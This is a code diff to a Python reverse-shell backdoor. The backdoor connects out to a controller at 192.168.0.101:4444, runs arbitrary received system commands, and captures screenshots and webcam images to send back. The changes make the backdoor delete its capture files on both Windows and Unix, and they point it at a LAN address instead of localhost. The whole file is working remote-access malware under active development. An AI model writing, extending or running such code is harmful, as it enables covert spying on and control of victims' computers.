@@ -9,8 +9,6 @@ import base64
 import mss
 import cv2
 
-print(os.name)
-
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -75,16 +73,21 @@ class Backdoor:
                     im = mss.mss().shot(output="screen.png")
                     command_result = self.read_file("screen.png")
                     
-                    os.system("del screen.png")
-                    # os.system("rm screen.png")
+                    if os.name == "nt":
+                        os.system("del screen.png")
+                    else:
+                        os.system("rm screen.png")
                 elif command.split()[0] == "camera":
                     cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                     result, image = cam.read()
                     cv2.imwrite("camera.jpg", image)
                     command_result = self.read_file("camera.jpg")
                     
-                    os.system("del camera.jpg")
-                    # os.system("rm camera.jpg")
+                    if os.name == "nt":
+                        os.system("del camera.jpg")
+                    else:
+                        os.system("rm camera.jpg")
+                    
                     cam.release()
                 else:
                     command_result = self.execute_system_command(command)                                   
@@ -94,7 +97,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("localhost", 4444)
+my_backdoor = Backdoor("192.168.0.101", 4444)
 my_backdoor.run()
 
 
